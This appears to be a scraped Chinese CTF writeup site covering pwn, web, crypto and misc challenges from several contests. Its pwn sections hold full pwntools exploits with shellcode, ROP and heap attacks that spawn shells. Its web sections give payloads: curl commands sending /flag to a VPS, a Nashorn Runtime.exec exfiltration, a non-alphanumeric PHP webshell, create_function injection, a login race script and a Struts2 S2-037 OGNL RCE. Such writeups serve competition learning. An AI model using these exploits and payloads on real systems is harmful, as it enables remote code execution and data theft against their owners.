\"\\x31\\xc0\\x31\\xd2\\x31\\xdb\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0\\x0b\\xcd\\x80\" log.success(\"ret: \" + hex(ret)) log.success(\"ebp: \" + hex(ebp)) log.success(\"buf_addr: \" + hex(buf_addr)) sh.sendline(payload) sh.interactive() if __name__ == \"__main__\": pwn(\"127.0.0.1\",10000,1) babyheap 原理知识 1） 了解栈溢出，并灵活使用rop技术 解题过程 1）chunk中带有puts_got，通过末尾连接，通过show功能就可以知道libc，从而计算出system地址 2）程序中有明显的堆溢出，所以直接覆盖chunk中的puts为system，然后show一个内容为/bin/sh的chunk，即可拿到shell Exp如下： #!/usr/bin/python2.7 # -*- coding: utf-8 -*- from pwn import * context.log_level = \"debug\" context.arch = \"amd64\" elf = ELF(\"pwn\") sh = 0 lib = 0 def add(content): sh.sendlineafter(\"Your choice: \",\"1\") sh.send(content); def edit(idx,size,content): sh.sendlineafter(\"Your choice: \",\"2\") sh.sendlineafter(\":\",str(idx)) sh.sendlineafter(\":\",str(size)) sh.sendafter(\":\",content) def free(idx): sh.sendlineafter(\"Your choice: \",\"4\") sh.sendlineafter(\":\",str(idx)) def show(idx): sh.sendlineafter(\"Your choice: \",\"3\") sh.sendlineafter(\":\",str(idx)) def pwn(ip,port,debug): global sh global lib if(debug == 1): sh = process(\"./pwn\") lib = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") else: sh = remote(ip,port) lib = ELF(\"x64_libc.so.6\") add('a' * 0x10) edit(0,0x100,'a' * 0x18) show(0) puts = u64(sh.recvuntil(\"\\x7f\")[-6:].ljust(8,'\\x00')) libc = puts - lib.symbols['puts'] system = libc +lib.symbols['system'] payload = '/bin/sh\\x00' payload = payload.ljust(0x18,'a') payload += p64(system) edit(0,0x100,payload) show(0) log.success(\"libc: \" + hex(libc)) log.success(\"system: \" + hex(system)) sh.interactive() if __name__ == \"__main__\": pwn(\"127.0.0.1\",9090,0) babyrop 原理知识 1） 了解栈溢出，并灵活使用rop技术 解题过程 1）首先覆盖变量，然后开启后门，然后通过后门函数来libc leak，然后再次回到后门函数，再次跳转到libc空间执行system(“/bin/sh\\x00”)，需要注意的是，对ret地址进行了check，所以先跳到ret上，然后通过check再到libc空间。 Exp如下： #!/usr/bin/python2.7 # -*- coding: utf-8 -*- from pwn import * context.log_level = \"debug\" context.arch = \"i386\" elf = ELF(\"pwn\") sh = 0 lib = 0 def pwn(ip,port,debug): global sh global lib if(debug == 1): sh = process(\"./pwn\") lib = ELF(\"/lib/i386-linux-gnu/libc.so.6\") else: sh = remote(ip,port) lib = ELF(\"x86_libc.so.6\") offset = 0x20 payload = offset * 'a' + p32(0x66666666) sh.sendafter(\"CTFer!\",payload) pop_ret = 0x0804865b offset = 0x14 payload = offset * \"a\" + p32(elf.plt['puts']) + p32(pop_ret) + p32(elf.got['__libc_start_main']) + p32(0x0804853D) sh.sendafter(\"?\\n\",payload) __libc_start_main = u32(sh.recvuntil(\"\\xf7\")[-4:]) libc = __libc_start_main - lib.symbols['__libc_start_main'] system = libc +lib.symbols['system'] binsh = libc +lib.search(\"/bin/sh\\x00\").next() offset = 0x14 payload = offset * \"a\" + p32(0x0804839e) + p32(system) + p32(pop_ret) + p32(binsh) sh.sendafter(\"?\\n\",payload) log.success(\"libc: \" + hex(libc)) log.success(\"system: \" + hex(system)) log.success(\"binsh: \" + hex(binsh)) sh.interactive() if __name__ == \"__main__\": pwn(\"127.0.0.1\",9090,0) 运行结果如下： Driver 原理知识 1） 通过off by one实现unlink，然后通过unlink实现House of spirit，从而实现堆块重叠 解题过程 1）运行程序，初步测试功能 2）导入IDA分析，发现只能购买三种车，A车可以申请到0x68的堆块，B车可以申请到0xf8的堆块，C车可以申请到0x220的堆块。在edit函数发现off by one，但是只能用一次，利用B车的堆块可以实现unlink，然后通过SpeedUp功能，在特定位置设置FakeFastbin的size位，并且同时可以覆盖name的指针，但是这样无法触发getLiscense功能修改free_hook，且没有办法知道libc位置，所以将第一辆车的指针改到第二辆车的speed位，然后House of Spirit通过第一辆车的name指针来修改第二辆车的结构体，通过修改第二辆车的指针，可以通过show的功能leak libc，然后通过unsorted bin attack，修改Liscense的数据为一个很大值，同时在第二辆车的name指针覆盖为free_hook，通过backdoor额外获得一次edit的功能来修改__free_hook为system，同时设置好/bin/sh\\x00字符串即可拿到shell。 脚本如下： #!/usr/bin/python2.7 # -*- coding: utf-8 -*- from pwn import * context.log_level = \"debug\" context.arch = \"amd64\" elf = ELF(\"pwn\") sh = 0 lib = 0 def add(idx,content): sh.recvuntil(\">>\") sh.sendline(\"1\") sh.recvuntil(\">>\") sh.sendline(str(idx)) sh.recvuntil(\":\") sh.send(content) def show(): sh.recvuntil(\">>\") sh.sendline(\"2\") def free(idx): sh.recvuntil(\">>\") sh.sendline(\"3\") sh.recvuntil(\":\") sh.sendline(str(idx)) def edit(idx,content): sh.recvuntil(\">>\") sh.sendline(\"4\") sh.recvuntil(\":\") sh.sendline(str(idx)) sh.recvuntil(\":\") sh.send(content) def gift(): sh.recvuntil(\">>\") sh.sendline(\"8\") sh.recvuntil(\"gift: \") return int(sh.recvuntil(\"\\n\",True),16) def up1(idx): sh.recvuntil(\">>\") sh.sendline(\"5\") sh.recvuntil(\":\") sh.sendline(str(idx)) sh.recvuntil(\">>\") sh.sendline(\"1\") sh.recvuntil(\">>\") sh.sendline(\"1\") sh.recvuntil(\"Car's Speed is \") return int(sh.recvuntil(\"Km/h\",True),10) def getlicense(idx,content): sh.recvuntil(\">>\") sh.sendline(\"6\") sh.recvuntil(\":\") sh.sendline(str(idx)) sh.recvuntil(\":\") sh.sendline(content) def up2(idx): sh.recvuntil(\">>\") sh.sendline(\"5\") sh.recvuntil(\":\") sh.sendline(str(idx)) sh.recvuntil(\">>\") sh.sendline(\"1\") sh.recvuntil(\">>\") sh.sendline(\"2\") sh.recvuntil(\"Car's Speed is \") return int(sh.recvuntil(\"Km/h\",True),10) def down(idx): sh.recvuntil(\">>\") sh.sendline(\"5\") sh.recvuntil(\":\") sh.sendline(str(idx)) sh.recvuntil(\">>\") sh.sendline(\"2\") def pwn(ip,port,debug): global sh global lib if(debug == 1): sh = process(\"./pwn\") lib = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") else: sh = remote(ip,port) lib = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") add(3,'\\x11' * 0x220) #idx 0 add(2,'\\x22' * 0xf8) #idx 1 free(1) free(0) add(2,\"\\n\") #idx 0 add(2,\"\\x44\" * 0xf8) #idx 1 heap_base = gift() heap_base = (heap_base >> 12) 本地测试拿到shell easy_pwn 原理知识 1） 通过sprintf 造成溢出 解题过程 1）运行程序，初步测试功能 1） 导入IDA分析，发现有个 sprintf函数这个函数会 在输入一定长度的name 后造成溢出 覆盖到 stack上面的 size 位 从而知道一个溢出这也我们就能rop 溢出泄露拿权限 脚本如下： from pwn import * context.log_level = 'debug' exe = './pwn' libc = 'libc.so.6' #p = process(exe) p = remote('127.0.0.1',10000) elf = ELF(exe) lib = ELF('x86_libc.so.6') def d(s=''): gdb.attach(p, s) main = 0x804858B p.recvuntil('id:') p.sendline('10') p.recvuntil('your name:') p.sendline('BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBaaaa') payload = 'A'*0x18+'bbbb'+p32(elf.plt['puts'])+p32(main)+p32(elf.got['puts']) p.recvuntil('me?\\n') p.sendline(payload) p.recvuntil('mean!\\n') puts_addr = u32(p.recv(4)) libc_base = puts_addr - lib.sym['puts'] success('libc_base--->'+hex(libc_base)) p.recvuntil('id:') p.sendline('10') p.recvuntil('your name:') p.sendline('BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBaaaa') system = libc_base + lib.sym['system'] binsh = libc_base + lib.search(\"/bin/sh\\x00\").next() payload = 'A'*0x18+'bbbb'+p32(system)+p32(main)+p32(binsh) p.recvuntil('me?\\n') p.sendline(payload) p.interactive() Hermes 原理知识 Gets函数是不安全的函数，会导致栈溢出，通过覆盖返回地址可以跳转到sys函数中。 解题过程 1）打开浏览器，下载程序 2）用IDAx64打开程序 3）查看到name函数中有溢出点，sys函数中有shell 4）编写脚本，完成栈溢出的利用 Sosoeasypwn 原理知识 函数指针的认识，和对pie 保护的认识。然后我们能绕过 pie 解题过程 1）打开浏览器，下载程序 2）用IDA打开程序 3）发现第二个函数 没有溢出但是 答应了一个函数的前几位地址 然后是没有溢出的输入 第三个函数 接受我们的输入 然后复制函数指针。 但是如果我们 输入的是 1,2 以外的 数 v1 就不会得到函数指针而是用 stack 上的值 我们就可以 通过第二个函数布置 但是 开启pie 我们只能得到 addr 的前2字节 我们发现有后面函数就能爆破半字节从而 调用后门函数得到shell 4）编写脚本，完成函数指针的利用和pie的绕过。 Crypto BabyRsa 原理知识 1） 对两素数乘积N进行因式分解。 2） 根据欧拉 公式计算出私钥d，进行解密。 ECC和AES基础 原理知识 1） 公钥密码，解决了密钥分配问题，安全性大大提高。同时，公钥密码的加、解密需要付出的成本更高，速度更慢。适用于短信息加密 2） 对称密码，密钥分配问题难以解决。但其拥有良好的加密性能与加密效率，适用于大文件加密。 3） 现在，市场上的加密机制多采用公钥密码与私钥密码组合加密的模式。即，使用公钥密码加密密钥，使用对称密码加密信息 4） ECC基于椭圆曲线，离散对数难解问题。对其攻击方法，现有BSGS（小步大步法）、Pohlig-Hellman法（相当有效）等 解题过程 下载压缩包，记事本打开阅读加密算法，如下图 2）题目，首先用ECC加密aes的密钥，然后用aes加密明文 首先，通过解开ecc的私钥k（注意区分大小k、K），继而求得aes密钥。如图，这里使用的是sage，用python也可。 得到aes_key后，解密密文，即可得到flag，如下图 不仅仅是RSA 原理知识 1） 由于两组加密p相同可以很容易求出q，得到突破口 2）摩斯音频转换需要找到合适方法 解题过程 下载附件，得到5个文件 2）首先分析RSA.py 分析得到： n1=p1*q n2=p2*q ∴模不互素 （gcd(n1,n2)!=1） ∴gcd(n1,n2)=q 3）根据pem文件得到两个公钥 根据wav文件得到密文c 编写解密脚本，运行即可获得flag 一句话加密 原理知识 1） e=2是Rabin算法，而不是RSA由于两组加密p相同可以很容易求出q，得到突破口 2） 遇到不熟悉密码是快速搜索能力 解题过程 下载附件，得到2个文件 2）首先分析encode.py,果然如题目，是一句话加密 分析大概应该是rsa之类的，得找到公钥（n,e） 分析e.jpg 不知道什么密码 用HxD打开，看到最后有一段16进制数，猜测是n,还提示了个kobe 5）百度搜索kobe 发现kobe code 这个密码会出现的科比的球鞋上 解密e 得到e=2 6)e=2,那说明是RSA的衍生算法Rabin了，根据已经得到的数据，推理出完整的加密算法 7）分解n,并写解密exp 8）修改c,两次运行脚本拼接得到flag 评论区 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-11-01 02:09:15 0 issues reported "},"articals/2019shendun.html":{"url":"articals/2019shendun.html","title":"2019上海神盾杯","keywords":"","body":"2019上海市神盾杯 题目类型： 类型 年份 难度 官方赛事题 2019 中 题目下载： 暂无 网上公开WP: https://xz.aliyun.com/t/5417 https://mochazz.github.io/2019/06/14/2019神盾杯上海市网络安全竞赛Web题解/ https://skysec.top/2019/07/03/2019%20%E7%A5%9E%E7%9B%BE%E6%9D%AF%20final%20Writeup%EF%BC%881%EF%BC%89/ https://skysec.top/2019/07/04/2019-%E7%A5%9E%E7%9B%BE%E6%9D%AF-final-Writeup%EF%BC%882%EF%BC%89/ 本站备份WP： 感谢作者：七月火 WEB easyadmin cookie使用了jwt，爆破key并伪造role值为admin，登陆即可获得flag easygallery-1 HTML源码里面提示 还有一个如下链接：http://xxxx/gallery.php?path=http://127.0.0.1:8082/gallery/static/img/portfolio-1.jpg 猜测可能是SSSRF读取/flag。先在自己VPS上随便写一个 ，然后让题目尝试加载 http://xxxx/gallery.php?path=http://VPS/index.php 发现是空的，怀疑是不是有后缀jpg限制，所以尝试 http://xxxx/gallery.php?path=http://VPS/index.php%23.jpg 发现题目成功访问了我的VPS，并获得了PHPINFO内容。那么接下来就同样尝试使用file协议读取/flag。这里之所以加一个%23，是因为在HTML中，%23是锚点，所以后端程序获得的path参数对应的值为file:///flag，而加了%23.jpg又可以绕过题目限制。还可以看一下后端是使用什么程序发起请求的： 最终payload：http://xxxx/gallery.php?path=file:///flag%23.jpg easygallery-2 同样，在HTML源码里面有这样一个链接 http://xxx/download.php?f=http://127.0.0.1/img/portfolio-1.jpg这次再使用file:///flag%23.jpg 会提示scheme error!，说明后端代码可能禁用了file协议。使用上题相同的方法，可以发现后台使用的是curl来访问我们的VPS。 猜测后台可能是直接用拼接字符串，然后执行curl命令。尝试访问 http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+mochazz%23.jpg 发现其请求是 POST方式，所以这题很有可能是命令执行。 尝试使用 http://xxx/download.php?f=http://39.108.143.11:8888/index.php+-d+/flag%23.jpg 没有获得flag，继续尝试curl的-F参数。最终payload：http://xxxx/download.php?f=http://VPS/index.php+-F+myflag=@/flag+-F+x=mochazz.jpg easyupload 上传文件后没有回显文件地址，但以base64图片形式显示。page参数存在文件包含，但是过滤了://无法使用php伪协议读取源码。后台代码应该类似 include $_GET['page'].'.php'; 。上传zip文件时，还会显示显示不允许的文件类型!upload jpg or gif。 上传图片处还有一个功能，可以填在线图片地址，我们可以通过这里结合file协议读取/etc/passwd 源码里面base64解密就是文件内容。尝试读取 /var/www/html/index.php 等文件都失败了，可能网站路径不是这个。但是我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html file:///proc/self/cwd/index.php file:///proc/self/cwd/upload.php 这题我们前面说过可以直接添加GIF89a上传图片马，接下来就是要找到图片路径了。 路径定义在upload.php中，关键代码如下： $name= $_FILES['pic']['name']; $ext = pathinfo($name,PATHINFO_EXTENSION); $filename=basename($name,$ext); $rootpath=$ddir.md5($filename).\".\".$name; 这样我们就可以获得图片路径了 /proc/self/cwd/$rootpath 。接下来直接利用题目最开始的文件包含 http://xxxx/index.php?page=submit 但是这里还有一个坑。坑在upload.php中有这样一段代码： if(preg_match('/^ph(.*)$/i',$ext)){ if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml','phps'])) { file_put_contents($rootpath,preg_replace(\"/\\?/\",\"\",file_get_contents($rootpath))); } } 会把文件中的 ? 号给去掉，所以我们不能用 这种写法，而要用 phpinfo();@eval($_GET[_]); 接着直接包含即可执行命令：）当然，也可以不使用包含，直接访问马的路径。 fast_calc_2 请求包类似： POST /calc.php HTTP/1.1 Host: b4b74052eed440eb9c7899c932f61b6ce79f555733524dc2.changame.ichunqiu.com Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; UM_distinctid=16b3177db8f50f-05893ba84daad1-1b29140e-100200-16b3177db90396; pgv_pvi=517607424; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1559903068,1560408162; __jsluid=ab86d4cd5c34bd66f80a8891dc2e731e; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1560434036 Connection: close Content-Type: application/json Content-Length: 27 {\"target\":\"/\",\"expr\":\"1+1\"} fuzz一下，发现可能是python的SSTI 发现ban了 [] ，于是本地测成功一个payload ''.getattribute('class').base.getattribute(().class.mro.getitem(1),'subc'+'lasses')().getitem(40)('/flag').getattribute('read')() 但是题目提示没有 __base__ 属性，怀疑该属性应该是被ban了。 后来队友测出直接用open方法，用空格隔开方法名和括号即可直接读取flag。 然后看了一下源码 /proc/self/cwd/calc.php /proc/self/cwd/final.py fast_calc_1 初步判断，后端代码可能用的是nodejs或者JavaScript。 尝试用Object.getOwnPropertyNames(this).join('::::::')读取一下this对象属性，发现有java 再次尝试java.language.String，可以确认后端用的是Java了 Java中有一个新特性可以把JavaScript转成Java代码，所以这里可以执行JavaScript，即Nashorn接下来尝试使用java代码读取flag POST /calc.php HTTP/1.1 Host: xxx Content-Type: application/json {\"target\":\"/\",\"expr\":\"java.lang.Runtime.getRuntime().exec('curl VPS -d @/flag')\"} easysqli 两个点： username和password经过addslashes函数处理。 当username为admin时，会显示后台执行的sql语句。 利用条件比较苛刻，所以正常的SQL注入姿势是绕不过的，只能想到配合sprintf字符串格式化漏洞进行绕过，具体参考：https://paper.seebug.org/386/ 。猜测后台代码应该类似这样： $user = addslashes($_GET['user']); $pass = addslashes($_GET['pass']); $sql = sprintf(\"select * from users where username='%s' and password='$pass'\",$user); 最终利用payload： http://xxxx//result.php?user=admin&pass=%1$'=0# parser 题目附件： https://pan.baidu.com/share/init?surl=2_-7WPVSIgf7uCQuPk2wMA 密码：qppg 我们需要把解析后的AST文件翻译成PHP代码。 比如上面这段代码，翻译成PHP代码类似： try { ('var_'.$_GET['num'])('cat /flag'); } catch (Exception $e) {} 具体参考：https://github.com/nikic/PHP-Parser/blob/master/grammar/php5.y 上面的代码告诉我们，肯定有一个变量var_xxx其值可以为命令执行函数，例如：system函数。那么我们先来看一下这些var_xxx变量的命名规则： 可以看到 var_ 后面基本上跟的都是数字，那这题就很简单了，直接用BurpSuite爆破就行了。如果这题var_ 后面跟的是不规则的字符，那可能就要全部还原一下PHP代码了。 easymanager 题目提示：一个内部站点 所以可能存在内网。注册用户后登录，查看页面源代码会发现一个hinthint: function.php source code may help u 发现存在 function.php~ 文件。 访问 http:///xxxxxx/index.php?page=host ，会提示Permission Deny! 根据上面代码开头check_url函数可知，程序使用parse_url来解析url，而parse_url函数存在bypass。于是访问 http:///xxxxxx///index.php?page=host 虽然是显示404，但是这个页面的源码中又有提示： 直接访问http://xxxx/70b185c80f225924f86d4a1dedddd120.php 会提示you can not visit it directly。所以我们要 http://xxxx/index.php?page=70b185c80f225924f86d4a1dedddd120 这样访问。发现可以上传zip格式文件，那就可以考虑一下zip协议。上传一个zip压缩马，会发现其会读取zip文件的内容。 那么我们可以尝试创建软链接文件，将其打包成zip并上传，这样就可以读取网站源码了。例如下面读取index.php源码。 index.php host.php、function.php /etc/apache2/sites-available/000-default.conf 尝试读取 /flag 没读到。发现/etc/apache2/sites-available/000-default.conf中有/var/www/html/m4nag3r_u_dont_know目录，访问http://xxxx/m4nag3r_u_dont_know/index.php 出错，那么尝试读取/var/www/html/m4nag3r_u_dont_know/index.php源码 // /var/www/html/m4nag3r_u_dont_know/index.php 最后就是create_function代码注入了http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27ls%20/%27);//{}system(%27ls%20/%27);//) http://xxxx//m4nag3r_u_dont_know/?func=){}system(%27cat%20/flag_e10adc3949ba59abbe56e057f20f883e%27);//{}system(%27cat%20/flag_e10adc3949ba59abbe56e057f20f883e%27);//) cat market 一开始，我们会发现证书有问题，而且无法正常访问网站。 我们需要修改本地host，将where_is_my_cat.ichunqiu.com指向题目地址。在COOKIE中还会看到HOST字段，也把它设置成where_is_my_cat.ichunqiu.com，然后就可以正常访问网站了。 我们会发现网站底部有一个/source_code_version_1.tgz ，下下来审计。这里主要发现两个漏洞点。 第一个点：竞争漏洞 首先我们看下面注册和登录两段代码，注册的时候会执行两条SQL语句，其中一条会将locked字段设置为1。而登录的时候，会判断用户所对应的locked字段。如果为1，则表示用户被锁定并直接退出程序。 这样看来，好像我们即使注册了用户，也无法登录进去。但是，如果我们开启多个线程同时注册登录，那么就有可能登录进去，这就利用了竞争漏洞。我们在对数据进行增删改的时候，要给它加一把锁，避免此时用户读到脏数据（本该读取修改后的值，却读取了修改前的值）。关于竞争漏洞的解释，还可以参考这篇文章： https://seaii-blog.com/index.php/2017/04/26/49.html 而上面的代码，我们可以通过多线程的方式，同时进行注册和登录，在执行update locked之前查询用户的 locked 字段，，从而拿到用户的cookie信息。具体代码如下： import requests,time import threading,random reg_url = \"https://where_is_my_cat.ichunqiu.com:8006/checkregister.php\" log_url = \"https://where_is_my_cat.ichunqiu.com:8006/checklogin.php\" cookies = { \"HOST\" : \"where_is_my_cat.ichunqiu.com\" } def register(username,password): data = { \"username\" : username, \"password\" : password, \"code\" : int(time.time()) } r = requests.post(url=reg_url, data=data, cookies=cookies, verify=False) def login(username,password): data = { \"username\" : username, \"password\" : password, } s = requests.session() r = s.post(url=log_url, data=data, cookies=cookies, verify=False) print(\"===============================================================\\n\") print(r.cookies) print(\"===============================================================\\n\\n\") while True: username = \"moch33\" + str(random.randint(1,100000)) threading.Thread(target=register, args=(username,\"mochazz\")).start() threading.Thread(target=login, args=(username,\"mochazz\")).start() 第二个点：SSRF 在market.php文件中，有一处重定向，我们只需要绕过is_cat函数中的规则，即可利用这个功能进行SSRF。 而且redirect.php中还存在一个重定向，刚好可以结合绕过上面的规则限制。规则要求url以图片格式结尾，我们可以使用 ?、#、& 等等符号来绕过。 // redirect.php 接下来可以开始探测一波常用端口，看看上面有没其他web服务，然后会发现8080端口上运行这tomcat+struts2。 测一下Struts的漏洞，发现S2-037可用。 GET /market.php?url=https://where_is_my_cat.ichunqiu.com/redirect.php%3Fu%3Dhttp%253A//127.0.0.1%253A8080/struts2-rest-showcase/orders/3/%2528%252523_memberAccess%25253d%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%2529%25253f%2528%252523wr%25253d%252523context%25255b%252523parameters.obj%25255b0%25255d%25255d.getWriter%2528%2529%252C%252523rs%25253d%2540org.apache.commons.io.IOUtils%2540toString%2528%2540java.lang.Runtime%2540getRuntime%2528%2529.%252565%252578%252565%252563%2528%252523parameters.command%255B0%255D%2529.getInputStream%2528%2529%2529%252C%252523wr.println%2528%252523rs%2529%252C%252523wr.flush%2528%2529%252C%252523wr.close%2528%2529%2529%253Axx.toString.json%253F%2526obj%253Dcom.opensymphony.xwork2.dispatcher.HttpServletResponse%2526content%253D233%2526command%253Dcat%252520/flag%2526%23mochazz.jpg HTTP/1.1 Host: where_is_my_cat.ichunqiu.com:8006 Cookie: PHPSESSID=fkotbsvfhbdrfbjotnhbtriuq0; HOST=where_is_my_cat.ichunqiu.com 评论区 请文明评论，禁止广告 CTF Writeup®未经许可，禁止转载。Copyright © CTF Writeup all right reserved, powered by CTF WriteupModified at 2019-07-20 22:17:19 0 issues reported "},"articals/2017huxiang.html":{"url":"articals/2017huxiang.html","title":"2017湖湘杯","keywords":"","body":"2017湖湘杯 题目类型： 类型 年份 难度 官方赛事题 2017 中 题目下载： 暂无 网上公开WP： https://xz.aliyun.com/t/1692 https://xz.aliyun.com/t/1703 https://xz.aliyun.com/t/1706 https://xz.aliyun.com/t/1755 https://www.freebuf.com/articles/others-articles/155172.html http://www.cnblogs.com/L1B0/ https://blog.csdn.net/qq_35078631/article/details/78630704 https://www.freebuf.com/vuls/161116.html https://www.jianshu.com/p/e162e98bd34c https://www.freebuf.com/column/160343.html 本站备份WP： 感谢作者：niexinming、LB919、Assassinisme、一叶飘零 WEB Web200文件上传 一开始真的以为是文件上传，后面发现是骗人的，简单的文件包含，扫描发现存在flag.php payload: http://118.190.87.135:10080/?op=php://filter/convert.base64-encode/resource=flag 解密得到flag random 看了一下存在源码泄露 然后就是随机数种子的问题了被，我们看到时间戳是随机数的种子，猜测服务器的时间是标准时间，在本地搭建一个php脚本跑出来，爆破的前42位，用另一个python脚本进行访问php脚本如下 然后我们python脚本如下 import requests,re url_local = 'http://127.0.0.1/test.php' url = 'http://114.215.138.89:10080/index.php?' what = requests.get(url_local).content what=what.split(',') pwd ='' for i in range(10): pwd +=\"%\" pwd +=str(hex(int(what[i])))[2:] print pwd tempurl = url+\"pwd=\"+ pwd.decode('gb2312') print tempurl html = requests.get(tempurl).content print html #hxb2017{6583be26c1403c25677c03ac7b3d1f22} 事实上我们绕过第一步就可以成功了，这里出题的问题，因为匹配userLogin的时候用的居然是弱类型，如果没有输入就是空了，和字符串正好匹配…救过果断直接绕过 hxb2017{6583be26c1403c25677c03ac7b3d1f22} Web300 打开就能看到源码 ', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\\\', '^', '`', '|', '~'); foreach ($black_char as $b) { if (stripos($data, $b) !== false){ die(\"关键字WAF\"); } } $filename=rand_string(0x20).'.php'; $folder='uploads/'; $full_filename = $folder.$filename; if(file_put_contents($full_filename, 'shell\"; echo \"我的/flag,你读到了么\"; }else{ echo \"噢 噢,错了\"; } 是要自己构造特殊的shellcode了，还没有把路封死，因为没有过滤如下 = $ _ + ' ( ) [ ] { }等等 就是时间问题，构造主要注意几点 1.A可以用++进行计算，A++之后就是B 2.字符++后变成了0 3.''.[]之后报错返回的信息是Array可以构造POST了。加上[]{}.没有过滤即可构造 最终构造如下，提交时候需要将+替换成url $_=''.[];$__='%2b';$__=$_%2b%2b;$_=$_[$__];$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$_%2b%2b;$___=$_;$_%2b%2b;$__=$_;$_%2b%2b;$_%2b%2b;$_%2b%2b;$____=$_;$_%2b%2b;${'_'.$__.$___.$____.$_}['_'](${'_'.$__.$___.$____.$_}['__']); 访问得到flag POST内容如下 _=assert&__=eval($_POST['pass'])&pass=system('tac ../flag.php'); 非常好的参考资料https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.htmlhttp://www.freebuf.com/articles/web/9396.html学习了一波2333 Web400 最开始拿到题目：http://118.190.113.111:10080/index.php?act=user的时候挺没有头绪的 一开始以为是ssrf摸内网，又发现好像有上传，各种尝试302打进去探测端口，发现都挺奇怪的，一直没get到考点 后来发现有一个redirect.php，会重定向 于是在photo url处尝试了一下 http://118.190.113.111:10080/redirect.php?redirect=file:///etc/passwd 但是这里会被waf拦下，只允许通过.jpg和.png的结尾，于是尝试00截断 如下: 发现可以成功读取到内容 于是拿下源码进行分析（以下为本地测试，vps就打码了，毕竟是队友的） 在login.php里 如果是本地访问的话,token才会为1 在common.php中 可以发现debug的值为1会返回http头数据 于是猜想利用redirect.php请问，伪造本地登录 http://118.190.113.111:10080/redirect.php?redirect=login.php?username=1&password=1.jpg 这样是不是就可以达到本地登录的目的了呢？ （注：这里有个小坑，需要2次url编码，所以payload如下） 注意到源码中debug为1的时候会返回http头数据，跟进$result去处 可见http头被写入了图片中，于是我们去访问刚才生成的图片 可以看到我们需要的http头数据，里面就有我们需要的phpsession 将自己的phpsessionid改成这个 可见我们已经用haozi登录成功了 看upload.php 发现过滤并没有过滤.inc，并且token为1才可以上传 而我们注意到 这里的spl_autoload_register(); 我们测试一下 发现是可以解析.inc的 于是想到上次一个.inc文件 自己写了一个上传 再写了一个ls.inc system('ls'); ?> 于是上传 发现上传成功 注：记得改一下Content-Type否则过不了waf 此时利用 我们可以构造序列化 然后利用include参数包含路径 于是综合payload如下: 命令执行成功。 总结一下: 1.利用重定向+00截断读源码 2.利用重定向+debug获得本地登录的phpsessionid 3.上传.inc结尾的恶意文件 4.利用spl_autoload_register()的文件包含+cookie反序列化执行命令 MISC 流量分析 解题思路: Step1：直接打开，文件->导出对象->HTTP，可以看到flag.zip，保存下来。 Step2：flag.zip里面有很多数字，目测是RGB，于是写脚本形成图片。 Step3：从上图可以猜想图片是宽为887，长为111。 脚本如下：得到flag。 #-*- coding:utf-8 -*- from PIL import Image import re x = 887 #x坐标 通过对txt里的行数进行整数分解 y = 111 #y坐标 x*y = 行数 im = Image.new(\"RGB\",(x,y))#创建图片 file = open('ce.txt') #打开rbg值文件 #通过一个个rgb点生成图片 for i in range(0,x): for j in range(0,y): line = file.readline()#获取一行 rgb = line.split(\",\")#分离rgb im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素 im.show() MISC200 解题思路： 压缩包里一个apk和一个疑似被加密的flag，先把apk拖到apktools里看下源码， 可以看到一个EncryptImageActivity，貌似有点用 可以看到很useful的函数 继续往下看 这就是对文件进行加密的具体函数了，可以看到，使用key对文件逐位异或得到cipherText，联系上面的关键函数，可以得知，这个程序的工作流程： 1选择一个文件 2输入密码 3使用密码的md5值对原始文件进行逐位异或 4将加密后的cipherText写入新文件并输出 由于异或的特性，使用password的md5值对已经加密的文件再次加密能够得到原来的文件，所以我们的任务就是逆向找到password了！！ 上一句划掉 那么麻烦干嘛，扔到手机里运行一下（才不说我专心逆向找password，怕手机被加密另开了手机分身运行应用呢），发现密码已经是“记住”状态了，把flag.encrypted扔进去点击encrypt就会提示成功的创建了文件，只要提出来在Linux里直接能显示出图片了。 Flag：出题人你出来，自己选砖头！神™字迹辨认 Misc300 解题思路： Step1：文件是pxl后缀，于是上网搜了一下。 >>> import pickle >>> f = open('pixels.jpg.pkl') >>> print(pickle.load(f)) 用这个脚本打开文件，发现是一堆坐标，联想到是黑白图片的坐标，出现的位置为1，否则为0。 Step2：将这堆数据处理成如图形式，执行第二张图片所示的代码，可以得到一张图片。 将所得图片倒置反色得到如图 可知是一个卡通人物，是熟悉的Bill 